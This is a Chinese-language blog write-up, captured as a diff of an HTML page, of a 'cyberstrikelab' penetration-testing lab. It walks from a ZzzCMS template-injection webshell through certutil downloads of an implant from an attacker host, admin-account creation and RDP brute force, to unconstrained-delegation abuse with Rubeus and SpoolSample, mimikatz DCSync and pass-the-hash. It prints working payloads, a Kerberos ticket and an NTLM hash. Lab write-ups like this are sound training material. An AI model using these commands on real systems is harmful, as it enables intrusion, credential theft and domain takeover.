@@ -1,0 +1,488 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="google-site-verification" content="FVeTimbT1kTEtyy7CZnjl87tv6Zu3gYnjspaqbsrZ6M" />
+    <meta name="baidu-site-verification" content="codeva-4fIoJmJzzi" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="信息收集先看看fscan全端口扫描记录   存在一个cms网站去看看   去找找这个zzzcms的漏洞 Zzzcms 1.61 后台远程命令执行漏洞先弱口令 admin &#x2F;admin123456 进入后台然后直接修改模版文件，在这里卡了很久一直想去文件上传擦 直接去本地模版管理找到search.html修改内容为以下内容 1&#123;if:assert($_request[phpinf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="cyberstrikelab-lab8">
+<meta property="og:url" content="https://oceanzbz.github.io/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/index.html">
+<meta property="og:site_name" content="Oceanzbz&#39;s Blog">
+<meta property="og:description" content="信息收集先看看fscan全端口扫描记录   存在一个cms网站去看看   去找找这个zzzcms的漏洞 Zzzcms 1.61 后台远程命令执行漏洞先弱口令 admin &#x2F;admin123456 进入后台然后直接修改模版文件，在这里卡了很久一直想去文件上传擦 直接去本地模版管理找到search.html修改内容为以下内容 1&#123;if:assert($_request[phpinf">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/20250522104004881.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/20250522104206718.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/20250522120808331.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/20250522120946646.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/20250522215024002.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/20250522221217350.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/20250522221612822.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/20250523212051229.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/20250523212922240.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/20250523213202218.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/20250525212534810.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/20250525215901234.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/20250525221232183.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/20250525224234818.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/20250525225035464.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/20250525230402240.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/20250525230416298.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/20250525230753184.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/20250525231647470.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/20250525232318817.png">
+<meta property="article:published_time" content="2025-05-22T02:35:54.000Z">
+<meta property="article:modified_time" content="2025-05-25T15:23:47.068Z">
+<meta property="article:author" content="Oceanzbz">
+<meta property="article:tag" content="cyberstrikelab">
+<meta property="article:tag" content="内网渗透">
+<meta property="article:tag" content="域渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://oceanzbz.github.io/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/20250522104004881.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>cyberstrikelab-lab8</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-QWTJSPQL4F"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-QWTJSPQL4F');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="Oceanzbz&#39;s Blog" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/link/">Friends</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/05/11/CTF/WP/%E5%BE%A1%E7%BD%91%E6%9D%AF%E6%A0%A1%E8%B5%9Bwp/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://oceanzbz.github.io/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://oceanzbz.github.io/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/&text=cyberstrikelab-lab8"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://oceanzbz.github.io/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/&title=cyberstrikelab-lab8"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://oceanzbz.github.io/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/&is_video=false&description=cyberstrikelab-lab8"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=cyberstrikelab-lab8&body=Check out this article: https://oceanzbz.github.io/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://oceanzbz.github.io/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/&title=cyberstrikelab-lab8"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://oceanzbz.github.io/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/&title=cyberstrikelab-lab8"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://oceanzbz.github.io/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/&title=cyberstrikelab-lab8"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://oceanzbz.github.io/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/&title=cyberstrikelab-lab8"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://oceanzbz.github.io/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/&name=cyberstrikelab-lab8&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://oceanzbz.github.io/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/&t=cyberstrikelab-lab8"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Zzzcms-1-61-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text">Zzzcms 1.61 后台远程命令执行漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">内网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%9F%E8%B1%86%E6%8F%90%E6%9D%83"><span class="toc-number">3.1.</span> <span class="toc-text">土豆提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.2.</span> <span class="toc-text">内网信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.3.</span> <span class="toc-text">域内信息收集</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE-%E6%89%93%E5%8D%B0%E6%9C%BA%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.</span> <span class="toc-text">非约束委派 + 打印机漏洞</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        cyberstrikelab-lab8
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Oceanzbz</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-05-22T02:35:54.000Z" class="dt-published" itemprop="datePublished">2025-05-22</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/">攻防渗透</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/cyberstrikelab/" rel="tag">cyberstrikelab</a>, <a class="p-category" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a>, <a class="p-category" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>先看看fscan全端口扫描记录</p>
+<img src="/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/20250522104004881.png" class="">
+
+<p>存在一个cms网站去看看</p>
+<img src="/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/20250522104206718.png" class="">
+
+<p>去找找这个zzzcms的漏洞</p>
+<h2 id="Zzzcms-1-61-后台远程命令执行漏洞"><a href="#Zzzcms-1-61-后台远程命令执行漏洞" class="headerlink" title="Zzzcms 1.61 后台远程命令执行漏洞"></a>Zzzcms 1.61 后台远程命令执行漏洞</h2><p>先弱口令 admin &#x2F;admin123456 进入后台<br>然后直接修改模版文件，在这里卡了很久一直想去文件上传擦</p>
+<p>直接去本地模版管理找到search.html修改内容为以下内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="keyword">if</span>:<span class="title function_ invoke__">assert</span>(<span class="variable">$_request</span>[<span class="title function_ invoke__">phpinfo</span>()])&#125;<span class="title function_ invoke__">phpinfo</span>();&#123;end <span class="keyword">if</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/20250522120808331.png" class="">
+
+<p>此时就可以看到phpinfo了，那我们改成一句话木马连接也可以</p>
+<img src="/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/20250522120946646.png" class="">
+
+
+<p>在改一下代码就可以连接了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="keyword">if</span>:<span class="title function_ invoke__">assert</span>(<span class="variable">$_POST</span>[x])&#125;xxx&#123;end <span class="keyword">if</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>参考： <a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/4103">https://xz.aliyun.com/news/4103</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/58909740">https://zhuanlan.zhihu.com/p/58909740</a></p>
+<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>蚁剑连接不上去，所以就使用远程下载搭一下stowaway代理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://172.16.233.2/windows_x64_agent.exe test.exe</span><br></pre></td></tr></table></figure>
+
+<p>这个代理工具能拿到一个shell面板也能上传文件,所以为了方便我写一个木马弹到cs上，需要注意的是这个环境存在杀毒软件</p>
+<img src="/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/20250522215024002.png" class="">
+
+<p>之后在命令行中执行以下两条命令去下载做好的免杀木马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://172.16.233.2/main.txt main.txt</span><br><span class="line"></span><br><span class="line">certutil.exe -urlcache -split -f http://172.16.233.2/RingQ.exe RingQ.exe</span><br></pre></td></tr></table></figure>
+
+<img src="/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/20250522221217350.png" class="">
+
+<p>成功上线，先利用土豆提个权限</p>
+<h3 id="土豆提权"><a href="#土豆提权" class="headerlink" title="土豆提权"></a>土豆提权</h3><img src="/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/20250522221612822.png" class="">
+
+<p>然后添加一个用户3389上去关闭一波防火墙</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell net user oceanzbz admin@123</span><br><span class="line">shell net localgroup administrators oceanzbz /add</span><br><span class="line">shell REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>
+
+<img src="/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/20250523212051229.png" class="">
+
+<p>直接给他关了，方便后续的扫描操作。</p>
+<h3 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h3><img src="/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/20250523212922240.png" class="">
+
+<p>当前这个主机貌似没看着其他的网卡，这个10.5.5.2是一个内网的网卡，扫描和外网结果差不多。那就去翻翻配置文件连接下数据库吧</p>
+<img src="/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/20250523213202218.png" class="">
+
+<p>还是没什么发现，去扫瞄下c段</p>
+<img src="/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/20250525212534810.png" class="">
+
+<p>发现一个c段开了3389端口，那么去爆破试试密码。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 hydra -l administrator -P pass.txt rdp://10.5.5.33 -Vv</span><br></pre></td></tr></table></figure>
+
+<img src="/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/20250525215901234.png" class="">
+
+<p>发现用户和密码为administrator admin@123456 登录之后可以拿到第二个flag，不过此时我们还没有域用户的权限，但是此时10.5.5.33这台主机已经是在域内中了，看看能否拿到这台主机的system权限。</p>
+<img src="/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/20250525221232183.png" class="">
+<h3 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h3><p>使用cs自带的svc-exe可以提权到system权限，然后收集下域内信息</p>
+<img src="/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/20250525224234818.png" class="">
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ADFind查询非约束机器账户</span></span><br><span class="line">AdFind.exe -b &quot;DC=cyberstrikelab,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; dn</span><br></pre></td></tr></table></figure>
+
+<img src="/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/20250525225035464.png" class="">
+
+<p>可以发现cyberweb这台主机的机器用户是配置了非约束委派，下一步就是要想办法看看如何让域控访问我们控制的这台主机</p>
+<h2 id="非约束委派-打印机漏洞"><a href="#非约束委派-打印机漏洞" class="headerlink" title="非约束委派 + 打印机漏洞"></a>非约束委派 + 打印机漏洞</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用Rubeus监听来自域控的票据</span></span><br><span class="line">Rubeus.exe monitor /interval:2 /filteruser:DC$</span><br></pre></td></tr></table></figure>
+
+<img src="/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/20250525230402240.png" class="">
+
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">强制回连，获得域控机器账户的TGT</span><br><span class="line">shell SpoolSample.exe DC CYBERWEB</span><br></pre></td></tr></table></figure>
+
+<img src="/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/20250525230416298.png" class="">
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">rubeus导入票据</span></span><br><span class="line">Rubeus.exe ptt /ticket:doIFtDCCBbCgAwIBBaEDAgEWooIErDCCBKhhggSkMIIEoKADAgEFoRQbEkNZQkVSU1RSSUtFTEFCLkNPTaInMCWgAwIBAqEeMBwbBmtyYnRndBsSQ1lCRVJTVFJJS0VMQUIuQ09No4IEWDCCBFSgAwIBEqEDAgECooIERgSCBELeAgo8gfc1sOmVFHxh23jlld/MeJN/NEYNWOVmXG7H6J6jeQH/ux0qR9NhB8XEHpISi/k+m+d3MgVV9I97HPHPGpxMwwPwn283E5+JQBdhYK/Vq7eQhQScpw0+uojOX8Clvw/YjIv8V1G1Kqxyj+EbWm07KVjefQHMeuclOII27ZclrWuVxNQ1GI2GV+nLVrRMgGlKmh9FTnLKacg3lGZutWuUS1pU3OWc7Q0wClL6MeczUq378IMB3G4Vv3cAR8mY/niULKswPfzVbe6oeuvAIOpHHV6qoB631NiF48twHG78uZ+ExiVIU9p1juR7IL053H0LOSRTV/behPNz8c/mhcxCWDfXVEAn1gbibwUvrBSCiNP6hp234Qa4pbEB8PTlxXc0QYxQVF8VC+btIxx93APc+/W6wBzxPr65IIqlhlbV1NdUCIF2SGqliyHUdOIRF9llx52RaTsYhzX4D5Hsqoh8YLIs52q7o9gy6yyJi69qADD4jpmvC6exzl0l40qd+csY8vfb2Ojm5fwgNn1oDLWRxjPriEGQNSFIxBuDF4BD3lzWcQFbTsuBYl0a7NBXeFHFWwnDRoQrdO6UHSDcpJt0WRvo+8S+sr14PvTITr6BWeKafeBy/Ve+iovAFCZo7DbAUISpPxYdpIjUzIpfm7ZMLT015MGNYB16PhNvUL3tfavikHed87lgfvTs429bSOcYP1U1YnT8/z2TrIMuuKpvjyNq9cZmZeLsS9SnNCwiFartRSephd587X5ERqsg0ai/i87lWJCBCQ15a9LapH5vxYvnkHljhvT3/5Vo9RYfGiJbdEtxG1vR17LsGCV05ROpf8L0Fa0CdWXB84MSzXjoIySIRV9zAvvcsTfu+r6oTT7QL9ciG8FvaHY2Gtf32FlFOfVLdoy1B63d0nYoKoZmm09ImIFFjKV0871uhQ3po3nu1vVvJkiRHM7hVwhK9h9aHTtYahuig1z6oxqYVMsubnYlrUKIPKe6O/qTBSaJoH03cXnWYUxrObv5A5ekiIG6zuHsqmGaDXWZV/5SfB4DaztwJZHzvYwuCYsSR6IV2vWW4st9ONoWkzg08XXjvVoEqfqlpTs2WjxAPaK1kY8oIp7SHJ7DVovFnkf7puFHGbJ/wBCpdR61Pl1qj/ntuv1OVdRRb71DfTZHjmV4rXISZ3cjwAJTgKqlIUzzrkiTsmTrtk92z3eIfm9EE4NqkOJWmxd9sXhC58W4CVFnZXZ7A4BqiBctRX/ZMXLcz++55SqSLTg8Xbm01EXTVnQHU6XTdOPs+4ZRrXEo+r8I+hT0aQegwcDCCt1WseFh92ut06Y1zfyNcxcffBZPB3UA0Te49BxN493RdwbUw4RIObPUoucAW4r7i0p6Nk0MxXt+nnYHuKesYu+GhOStENyVjmbIcSLqd4cJNrBAX3cNZmCtSFGSuKahub4Lb7k0WoRZo4HzMIHwoAMCAQCigegEgeV9geIwgd+ggdwwgdkwgdagKzApoAMCARKhIgQgo+1mN3aSVBbGT0Sp9kwHxXFCpO+xUDGciGtbd189KomhFBsSQ1lCRVJTVFJJS0VMQUIuQ09NohAwDqADAgEBoQcwBRsDREMkowcDBQBgoQAApREYDzIwMjUwNTI1MDUwNDQwWqYRGA8yMDI1MDUyNTE1MDQ0MFqnERgPMjAyNTA2MDEwNTA0NDBaqBQbEkNZQkVSU1RSSUtFTEFCLkNPTaknMCWgAwIBAqEeMBwbBmtyYnRndBsSQ1lCRVJTVFJJS0VMQUIuQ09N    </span><br></pre></td></tr></table></figure>
+
+<p>导入成功</p>
+<img src="/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/20250525230753184.png" class="">
+
+<p>使用<a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz">mimikatz</a>导出Hash</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">mimikatz导出域内用户Hash</span></span><br><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:cyberstrikelab.com /user:cyberstrikelab\Administrator&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+
+<img src="/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/20250525231647470.png" class="">
+
+<p>之后打个pth就可以了</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 wmiexec.py -hashes :9d880175be3fc0e75ebb9686f482cfa5 cyberstrike.com/administrator@10.5.5.66</span><br></pre></td></tr></table></figure>
+
+<img src="/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/20250525232318817.png" class="">
+
+
+<p>参考： <a target="_blank" rel="noopener" href="https://forum.butian.net/share/1591">https://forum.butian.net/share/1591</a></p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/link/">Friends</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
